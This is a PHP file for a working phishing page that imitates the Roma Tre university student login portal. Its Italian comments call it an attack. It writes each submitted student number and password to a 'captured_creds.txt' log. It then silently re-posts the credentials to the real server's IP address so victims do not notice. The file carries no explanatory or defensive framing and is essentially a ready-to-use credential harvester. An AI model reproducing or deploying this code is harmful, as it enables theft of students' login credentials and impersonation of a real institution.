<?php
$log_file = 'captured_creds.txt';
$real_server_ip = "110.0.0.50";

// Se riceviamo i dati (l'attacco è riuscito)
if (isset($_POST['matricola'])) {
    $m = $_POST['matricola'];
    $p = $_POST['password'];
    
    $timestamp = date("Y-m-d H:i:s");
    $data = "[$timestamp] CATTURA -> Matricola: $m | Password: $p\n";
    
    // Scriviamo nel file (APPEND aggiunge in coda senza cancellare l'intestazione)
    file_put_contents($log_file, $data, FILE_APPEND);
    
    // Reindirizzamento trasparente al sito vero per non destare sospetti
    echo "<html><body onload='document.forms[0].submit()'>
          <form method='POST' action='http://$real_server_ip/index.php'>
          <input type='hidden' name='matricola' value='".htmlspecialchars($m)."'>
          <input type='hidden' name='password' value='".htmlspecialchars($p)."'>
          <input type='hidden' name='do_login' value='1'>
          </form></body></html>";
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Portale Studente - UniRoma3</title>
    <style>
        body { font-family: sans-serif; background-color: #001a33; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 10px; width: 300px; text-align: center; border-top: 5px solid #004a99; }
        h1 { color: #004a99; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #004a99; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Roma Tre</h1>
        <p>Accedi ai servizi online</p>
        <form method="POST">
            <input type="text" name="matricola" placeholder="Matricola" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Entra</button>
        </form>
    </div>
</body>
</html>